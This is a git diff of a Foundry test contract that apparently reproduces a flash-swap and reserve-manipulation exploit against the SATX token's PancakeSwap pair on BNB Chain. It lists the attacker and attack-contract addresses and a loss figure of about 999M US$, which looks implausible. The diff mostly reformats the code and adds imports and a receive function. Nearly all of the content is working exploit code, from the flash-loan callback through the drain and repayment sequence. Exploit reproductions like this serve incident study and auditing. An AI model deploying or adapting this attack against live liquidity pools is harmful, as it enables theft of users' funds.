@@ -2,7 +2,11 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
 
+import {IWBNB} from "src/interfaces/IWBNB.sol";
+import {IPancakePair} from "src/interfaces/IPancakePair.sol";
+import {IPancakeRouter} from "src/interfaces/IPancakeRouter.sol";
 // @KeyInfo - Total Lost : ~999M US$
 // Attacker : 0xBEF24B94C205999ea17d2ae4941cE849C9114bfd
 // Attack Contract : 0x9C63d6328C8e989c99b8e01DE6825e998778B103
@@ -17,13 +21,16 @@ import "forge-std/Test.sol";
 // Hacking God : https://www.google.com/
 
 contract ContractTest is Test {
-
     address public attacker = address(this);
     IERC20 constant SATX = IERC20(0xFd80a436dA2F4f4C42a5dBFA397064CfEB7D9508);
-    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
-    IPancakePair pair_WBNB_SATX = IPancakePair(0x927d7adF1Bcee0Fa1da868d2d43417Ca7c6577D4);
-    IPancakePair pair_WBNB_CAKE = IPancakePair(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
-    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+    IWBNB constant WBNB =
+        IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
+    IPancakePair pair_WBNB_SATX =
+        IPancakePair(0x927d7adF1Bcee0Fa1da868d2d43417Ca7c6577D4);
+    IPancakePair pair_WBNB_CAKE =
+        IPancakePair(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
+    IPancakeRouter router =
+        IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
 
     function setUp() public {
         vm.createSelectFork("bsc", 37_914_434 - 1);
@@ -47,22 +54,48 @@ contract ContractTest is Test {
         path[0] = address(WBNB);
         path[1] = address(SATX);
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            1_000_000_000_000_000, 0, path, attacker, type(uint256).max
+            1_000_000_000_000_000,
+            0,
+            path,
+            attacker,
+            type(uint256).max
         );
         uint256 SATX_amount = SATX.balanceOf(attacker);
         router.addLiquidity(
-            address(WBNB), address(SATX), 1_000_000_000_000_000, SATX_amount, 0, 0, attacker, type(uint256).max
+            address(WBNB),
+            address(SATX),
+            1_000_000_000_000_000,
+            SATX_amount,
+            0,
+            0,
+            attacker,
+            type(uint256).max
         );
-        pair_WBNB_CAKE.swap(0, 60_000_000_000_000_000_000, attacker, bytes("1"));
+        pair_WBNB_CAKE.swap(
+            0,
+            60_000_000_000_000_000_000,
+            attacker,
+            bytes("1")
+        );
 
         uint256 WBNB_amount = WBNB.balanceOf(attacker);
         WBNB.withdraw(WBNB_amount);
     }
 
-    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+    function pancakeCall(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) external {
         if (msg.sender == address(pair_WBNB_CAKE)) {
             uint256 SATX_amount = SATX.balanceOf(address(pair_WBNB_SATX));
-            pair_WBNB_SATX.swap(100_000_000_000_000, SATX_amount / 2, attacker, data);
+            pair_WBNB_SATX.swap(
+                100_000_000_000_000,
+                SATX_amount / 2,
+                attacker,
+                data
+            );
 
             uint256 SATX_amount_1 = SATX.balanceOf(attacker);
             SATX.transfer(address(pair_WBNB_SATX), SATX_amount_1);
@@ -74,7 +107,11 @@ contract ContractTest is Test {
             path[0] = address(SATX);
             path[1] = address(WBNB);
             router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-                SATX_amount_2, 0, path, attacker, type(uint256).max
+                SATX_amount_2,
+                0,
+                path,
+                attacker,
+                type(uint256).max
             );
             WBNB.transfer(address(pair_WBNB_CAKE), 60_150_600_000_000_000_000);
         } else if (msg.sender == address(pair_WBNB_SATX)) {
@@ -83,5 +120,5 @@ contract ContractTest is Test {
     }
 
     fallback() external payable {}
-
+    receive() external payable {}
 }
